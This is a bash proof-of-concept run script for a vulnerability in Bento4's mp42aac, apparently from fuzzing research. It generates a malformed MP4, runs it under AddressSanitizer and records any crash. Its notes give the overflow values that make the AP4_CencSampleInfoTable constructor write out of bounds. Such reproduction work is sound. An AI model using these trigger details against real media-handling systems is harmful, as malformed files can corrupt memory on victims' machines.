#!/usr/bin/env bash
# Run script for VULN 001: Integer Overflow in AP4_CencSampleInfoTable Constructor

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY=/data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac
MP4_FILE="${SCRIPT_DIR}/vuln_001.mp4"
RESULT_FILE="${SCRIPT_DIR}/vuln_001_result.txt"
ASAN_LOG_BASE="${SCRIPT_DIR}/asan.log"

echo "=== VULN 001 PoC Run Script ===" | tee "${RESULT_FILE}"
echo "Date: $(date)" | tee -a "${RESULT_FILE}"
echo "" | tee -a "${RESULT_FILE}"

# Step 1: Generate the malicious MP4
echo "[*] Generating vuln_001.mp4 ..." | tee -a "${RESULT_FILE}"
python3 "${SCRIPT_DIR}/vuln_001_gen.py" 2>&1 | tee -a "${RESULT_FILE}"
echo "" | tee -a "${RESULT_FILE}"

if [ ! -f "${MP4_FILE}" ]; then
    echo "[!] ERROR: MP4 file not generated" | tee -a "${RESULT_FILE}"
    exit 1
fi

echo "[*] MP4 file size: $(wc -c < "${MP4_FILE}") bytes" | tee -a "${RESULT_FILE}"
echo "" | tee -a "${RESULT_FILE}"

# Step 2: Run mp42aac with ASAN options
# Use a 32-character hex key (16 bytes of zeros) as required by --key option
echo "[*] Running mp42aac with CENC key (all zeros) ..." | tee -a "${RESULT_FILE}"
echo "[*] Command: mp42aac --key 00000000000000000000000000000000 vuln_001.mp4 /dev/null" | tee -a "${RESULT_FILE}"
echo "" | tee -a "${RESULT_FILE}"

ASAN_OPTIONS="abort_on_error=0:log_path=${ASAN_LOG_BASE}" \
    "${BINARY}" --key 00000000000000000000000000000000 \
    "${MP4_FILE}" /dev/null \
    >> "${RESULT_FILE}" 2>&1 || true

echo "" | tee -a "${RESULT_FILE}"

# Step 3: Also try without --key to test the parse path
echo "[*] Running mp42aac WITHOUT key (parse-only path) ..." | tee -a "${RESULT_FILE}"
ASAN_OPTIONS="abort_on_error=0:log_path=${ASAN_LOG_BASE}" \
    "${BINARY}" "${MP4_FILE}" /dev/null \
    >> "${RESULT_FILE}" 2>&1 || true

echo "" | tee -a "${RESULT_FILE}"

# Step 4: Check ASAN logs
echo "[*] Checking ASAN logs ..." | tee -a "${RESULT_FILE}"
ASAN_FOUND=0
for f in "${ASAN_LOG_BASE}".*; do
    if [ -f "${f}" ]; then
        echo "[*] Found ASAN log: ${f}" | tee -a "${RESULT_FILE}"
        echo "--- BEGIN ASAN LOG ---" | tee -a "${RESULT_FILE}"
        cat "${f}" | tee -a "${RESULT_FILE}"
        echo "--- END ASAN LOG ---" | tee -a "${RESULT_FILE}"
        ASAN_FOUND=1
    fi
done

# Also check for ASAN output in stderr (sometimes goes there even with log_path)
if grep -qiE "AddressSanitizer|heap-buffer-overflow|stack-buffer-overflow|SEGV|abort.*asan|runtime error" "${RESULT_FILE}" 2>/dev/null; then
    ASAN_FOUND=1
fi

echo "" | tee -a "${RESULT_FILE}"
if [ "${ASAN_FOUND}" -eq 1 ]; then
    echo "[!] CRASH DETECTED via ASAN/UBSAN" | tee -a "${RESULT_FILE}"
else
    echo "[*] No ASAN/UBSAN crash detected" | tee -a "${RESULT_FILE}"
fi

echo "" | tee -a "${RESULT_FILE}"
echo "=== Analysis Notes ===" | tee -a "${RESULT_FILE}"
echo "The vulnerability is in AP4_CencSampleInfoTable::AP4_CencSampleInfoTable():" | tee -a "${RESULT_FILE}"
echo "  line 3007: m_IvData.SetDataSize(m_IvSize * sample_count)" | tee -a "${RESULT_FILE}"
echo "With m_IvSize=16, sample_count=0x10000000:" | tee -a "${RESULT_FILE}"
echo "  16 * 0x10000000 = 0x100000000 -> truncates to 0 (32-bit overflow)" | tee -a "${RESULT_FILE}"
echo "  m_IvData.SetDataSize(0) -> m_IvData.m_Buffer stays NULL" | tee -a "${RESULT_FILE}"
echo "  SetIv(0, data) -> memcpy(NULL, data, 16) -> OOB WRITE" | tee -a "${RESULT_FILE}"
echo "" | tee -a "${RESULT_FILE}"
echo "Note: mp42aac uses AP4_SampleDecrypter::Create(pdesc,key,size) which returns NULL" | tee -a "${RESULT_FILE}"
echo "for CENC scheme (only OMA/IAEC are handled). The crash requires the traf-aware" | tee -a "${RESULT_FILE}"
echo "version: AP4_SampleDecrypter::Create(pdesc,traf,...) used by other Bento4 tools." | tee -a "${RESULT_FILE}"

echo "[DONE]" | tee -a "${RESULT_FILE}"
